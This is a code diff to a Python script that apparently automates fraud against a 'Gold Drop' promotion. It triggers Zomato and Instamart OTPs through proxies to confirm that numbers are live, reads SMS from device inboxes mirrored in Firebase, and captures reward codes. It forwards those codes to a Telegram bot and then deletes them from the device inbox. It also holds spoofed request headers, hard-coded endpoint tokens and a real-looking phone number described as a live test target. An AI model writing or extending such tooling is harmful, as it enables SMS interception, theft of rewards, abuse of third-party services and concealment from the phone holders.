@@ -235,16 +235,22 @@ def log(msg, level="INFO"):
 # ─── Telegram ───────────────────────────────────────────────────────────────
 
 def send_telegram_alert(message):
+    """Send a Telegram alert. Returns True only if Telegram confirmed delivery."""
     try:
         url = "https://api.telegram.org/bot%s/sendMessage" % TG_BOT_TOKEN
-        requests.post(url, json={
+        r = requests.post(url, json={
             "chat_id": TG_CHAT_ID,
             "text": message[:4000],
             "parse_mode": "HTML",
             "disable_web_page_preview": True,
         }, timeout=15)
+        if r.status_code == 200 and r.json().get("ok"):
+            return True
+        log("TG alert rejected: %s" % r.text[:200], "ERROR")
+        return False
     except Exception as exc:
         log("TG alert error: %s" % exc, "ERROR")
+        return False
 
 
 # ─── File Helpers ───────────────────────────────────────────────────────────
@@ -289,6 +295,40 @@ def load_hits():
             return data if isinstance(data, list) else []
     except Exception:
         return []
+
+
+def attach_reward_sms(hit, text, msg_key):
+    """Persist the SMS code into the saved hit before deleting the source message."""
+    if not hit:
+        return
+    record = {
+        "text": text,
+        "message_key": str(msg_key),
+        "received_at": datetime.now(IST).isoformat(),
+    }
+    stamp = hit.get("timestamp")
+    with hits_lock:
+        for entry in hits:
+            if entry.get("timestamp") == stamp:
+                entry["reward_sms"] = record
+                break
+        try:
+            existing = []
+            if os.path.exists(HITS_FILE):
+                with open(HITS_FILE, "r", encoding="utf-8") as handle:
+                    existing = json.load(handle)
+            for entry in existing:
+                if entry.get("timestamp") == stamp:
+                    entry["reward_sms"] = record
+                    break
+            else:
+                saved = dict(hit)
+                saved["reward_sms"] = record
+                existing.append(saved)
+            with open(HITS_FILE, "w", encoding="utf-8") as handle:
+                json.dump(existing, handle, indent=2, ensure_ascii=False)
+        except Exception as exc:
+            log("reward SMS save error: %s" % exc, "ERROR")
 
 
 def load_settings():
@@ -500,6 +540,26 @@ def is_pincode_error(error):
     return "messageid" in text and "pincode" in text
 
 
+CONNECTION_ERROR_MARKERS = (
+    "proxyerror",
+    "unable to connect to proxy",
+    "tunnel connection failed",
+    "gateway time-out",
+    "gateway timeout",
+    "httpsconnectionpool",
+    "max retries exceeded",
+    "connectionerror",
+    "connection aborted",
+    "connection reset",
+)
+
+
+def is_connection_error(error):
+    """Proxy/network failures are routine — log them, never alert Telegram."""
+    text = str(error).lower()
+    return any(marker in text for marker in CONNECTION_ERROR_MARKERS)
+
+
 # ─── Firebase Functions ─────────────────────────────────────────────────────
 
 _PHONE_PATTERNS = [
@@ -531,6 +591,17 @@ def fetch_messages(db_url, device_id, limit=150):
         '%s/messages/%s.json?orderBy="$key"&limitToLast=%d'
         % (db_url.rstrip("/"), device_id, limit)
     ) or {}
+
+
+def delete_firebase_message(db_url, device_id, msg_key):
+    """Delete one message node from the Firebase inbox. Direct connection, no proxy."""
+    url = "%s/messages/%s/%s.json" % (db_url.rstrip("/"), device_id, str(msg_key))
+    try:
+        r = requests.delete(url, timeout=15)
+        return r.status_code == 200
+    except Exception as exc:
+        log("Message delete error: %s" % exc, "ERROR")
+        return False
 
 
 def message_text(msg):
@@ -634,8 +705,8 @@ def poll_firebase_for_otp(db_url, device_id, sender_pattern, timeout, interval, 
     return None
 
 
-def watch_reward_sms(db_url, device_id, after_key, seconds=90):
-    """On a win the redeemable code arrives by SMS, not HTTP. Watch and report it."""
+def watch_reward_sms(db_url, device_id, after_key, hit, seconds=90):
+    """Watch for the reward SMS, save + alert it, then remove it from the inbox."""
     deadline = time.time() + seconds
     seen = set()
     while time.time() < deadline:
@@ -651,11 +722,19 @@ def watch_reward_sms(db_url, device_id, after_key, seconds=90):
                     if "otp" in text_lower and "register" in text_lower:
                         continue  # the OTP SMS itself, not the reward notice
                     log("  Reward SMS: %s" % text, "HIT")
-                    send_telegram_alert(
+                    attach_reward_sms(hit, text, msg_key)
+                    delivered = send_telegram_alert(
                         "📩 <b>GOLD DROP REWARD SMS</b>\n"
                         "📟 Device: <code>%s</code>\n"
                         "💬 <pre>%s</pre>" % (html.escape(device_id), html.escape(text))
                     )
+                    if delivered:
+                        if delete_firebase_message(db_url, device_id, msg_key):
+                            log("  Reward SMS deleted from Firebase (key %s)" % msg_key, "HIT")
+                        else:
+                            log("  Reward SMS deletion failed (key %s)" % msg_key, "ERROR")
+                    else:
+                        log("  Reward SMS kept in inbox: Telegram delivery failed", "ERROR")
         except Exception:
             pass
 
@@ -801,9 +880,94 @@ def report_win(decoded, phone, device_id, db_url, meta, baseline_key):
     send_telegram_alert(alert)
     threading.Thread(
         target=watch_reward_sms,
-        args=(db_url, device_id, baseline_key),
+        args=(db_url, device_id, baseline_key, hit),
         daemon=True,
     ).start()
+
+
+# ─── Instamart fallback (only when Zomato rejects / errors) ────────────────
+
+INSTAMART_SIGNIN_URL = "https://instamart.in/api/instamart/auth/signin-check"
+INSTAMART_SEND_URL = "https://instamart.in/api/instamart/auth/send-otp"
+INSTAMART_MATCHERS = {
+    "signin": "cfa8f8egbg8gee88ggddef9",
+    "send": "ed8ee8egbg8gee8dddgc98e",
+}
+INSTAMART_BUILD_VERSION = "2.393.0"
+INSTAMART_UA = ("Mozilla/5.0 (Linux; Android 16; Pixel 10) AppleWebKit/537.36 "
+                "(KHTML, like Gecko) Chrome/157.0.0.0 Mobile Safari/537.36")
+# Observed live sender: VM-SWIGGY-S, "This is a Swiggy login OTP... Your OTP 176024..."
+INSTAMART_SENDER_KEYWORDS = ("INSTAMART", "SWIGGY-S", "IMART")
+INSTAMART_TEXT_KEYWORDS = ("instamart", "swiggy login")
+INSTAMART_LOCK = threading.Lock()
+INSTAMART_LAST_CALL = 0
+
+
+def instamart_send_otp(phone, proxies=None):
+    """Two-call Instamart OTP flow, verified live against 9382771876."""
+    global INSTAMART_LAST_CALL
+    with INSTAMART_LOCK:
+        elapsed = time.time() - INSTAMART_LAST_CALL
+        if elapsed < 3:
+            time.sleep(3 - elapsed)
+        INSTAMART_LAST_CALL = time.time()
+
+    device_id = str(uuid.uuid4())
+    headers = {
+        "content-type": "application/json",
+        "x-build-version": INSTAMART_BUILD_VERSION,
+        "x-device-id": device_id,
+        "user-agent": INSTAMART_UA,
+        "accept": "*/*",
+        "origin": "https://instamart.in",
+        "referer": "https://instamart.in/auth",
+    }
+    s = requests.Session()
+    if proxies:
+        s.proxies.update(proxies)
+    try:
+        for url, matcher in ((INSTAMART_SIGNIN_URL, INSTAMART_MATCHERS["signin"]),
+                             (INSTAMART_SEND_URL, INSTAMART_MATCHERS["send"])):
+            h = dict(headers)
+            h["matcher"] = matcher
+            r = s.post(url, json={"data": {"mobile": phone}}, headers=h, timeout=20)
+            data = (r.json() or {}).get("data") or {}
+            if r.status_code != 200 or data.get("statusCode") != 0:
+                log("  Instamart %s failed: HTTP %s %s"
+                    % (url.rsplit("/", 1)[-1], r.status_code, str(data)[:200]), "ERROR")
+                return False
+        return True
+    except Exception as exc:
+        log("Instamart OTP error for %s: %s" % (phone, exc), "ERROR")
+        return False
+    finally:
+        s.close()
+
+
+def is_instamart_message(msg):
+    sender = message_sender(msg).upper()
+    text = message_text(msg).lower()
+    if any(kw in sender for kw in INSTAMART_SENDER_KEYWORDS):
+        return True
+    return any(kw in text for kw in INSTAMART_TEXT_KEYWORDS)
+
+
+def poll_for_instamart_otp(db_url, device_id, timeout=20, interval=3, last_key=None):
+    """Confirm the fallback OTP actually landed on the device."""
+    if last_key is None:
+        last_key = get_last_message_key(db_url, device_id)
+    start = time.time()
+    while time.time() - start < timeout:
+        time.sleep(interval)
+        try:
+            for msg_key, msg in fetch_messages(db_url, device_id, 20).items():
+                if msg_key <= last_key or not isinstance(msg, dict):
+                    continue
+                if is_instamart_message(msg) and re.search(r"\b\d{6}\b", message_text(msg)):
+                    return True
+        except Exception:
+            pass
+    return False
 
 
 # ─── Main Worker ────────────────────────────────────────────────────────────
@@ -868,11 +1032,19 @@ def firebase_worker(instance_id, start_idx, end_idx):
                             % (instance_id, phone, device_id[:12]))
 
                         if not zomato_send_otp(phone, proxies=proxy_dict):
-                            log("    [-] Zomato rejected number")
-                            continue
-                        if not poll_for_zomato_otp(db_url, device_id,
-                                                   last_key=zomato_baseline):
-                            log("    [-] Zomato OTP not received on device")
+                            # Fallback only when Zomato rejected the number or errored.
+                            # A missing Zomato OTP after a successful send is NOT a fallback case.
+                            log("    [-] Zomato rejected/errored; trying Instamart fallback")
+                            if not instamart_send_otp(phone, proxies=proxy_dict):
+                                log("    [-] Instamart fallback also failed")
+                                continue
+                            if not poll_for_instamart_otp(db_url, device_id,
+                                                          last_key=zomato_baseline):
+                                log("    [-] Instamart OTP not received on device")
+                                continue
+                        elif not poll_for_zomato_otp(db_url, device_id,
+                                                     last_key=zomato_baseline):
+                            log("    [-] Zomato OTP not received on device; skipping")
                             continue
 
                         log("    [+] Active number confirmed. Starting Gold Drop flow.")
@@ -917,14 +1089,18 @@ def firebase_worker(instance_id, start_idx, end_idx):
                                     reject_pincode(bad_pin)
                                     log("    [!] Pincode %s rejected by server; removed from pool"
                                         % bad_pin, "ERROR")
-                                routine = pincode_error or any(kw in error_lower for kw in (
-                                    "otp not received in time",
-                                    "otp verification failed",
-                                    "read timed out",
-                                    "timed out",
-                                    "connection pool",
-                                    "connectionerror",
-                                ))
+                                routine = (
+                                    pincode_error
+                                    or is_connection_error(error)
+                                    or any(kw in error_lower for kw in (
+                                        "otp not received in time",
+                                        "otp verification failed",
+                                        "read timed out",
+                                        "timed out",
+                                        "connection pool",
+                                        "connectionerror",
+                                    ))
+                                )
                                 if already:
                                     log("    [~] Number already used today, skipping: %s" % phone)
                                     break
@@ -999,6 +1175,22 @@ def dry_run():
     assert is_used_today_error(used_error), "participation error not classified as used-today"
     assert not is_used_today_error("BigCity OTP not received in time")
     log("Used-today detection: participation error matched, routine OTP error not matched")
+
+    proxy_error = ("HTTPSConnectionPool(host='golddropgolddhamaka.com', port=443): "
+                   "Max retries exceeded with url: /api/users (Caused by ProxyError("
+                   "'Unable to connect to proxy', OSError('Tunnel connection failed: "
+                   "504 Gateway Time-out')))")
+    assert is_connection_error(proxy_error), "proxy error not classified as routine"
+    assert not is_connection_error("Registration failed: {'messageId': 'participation'}")
+    log("Proxy/network errors: classified as routine, no Telegram alert")
+
+    assert is_instamart_message({
+        "sender": "VM-SWIGGY-S",
+        "message": "This is a Swiggy login OTP. Do not share the OTP. Your OTP 176024 to log into Swiggy account.",
+    })
+    assert is_instamart_message({"sender": "VK-INSTAMART-T", "message": "Your OTP is 123456"})
+    assert not is_instamart_message({"sender": "VK-BGCITY-T", "message": "Your OTP to register is 123456. Team BigCity"})
+    log("Instamart fallback: sender/text matching configured")
 
     assert len(TINY_JPEG) == 285 and TINY_JPEG[:2] == b"\xff\xd8" and TINY_JPEG[-2:] == b"\xff\xd9"
     log("TINY_JPEG: %d bytes, valid JPEG framing" % len(TINY_JPEG))
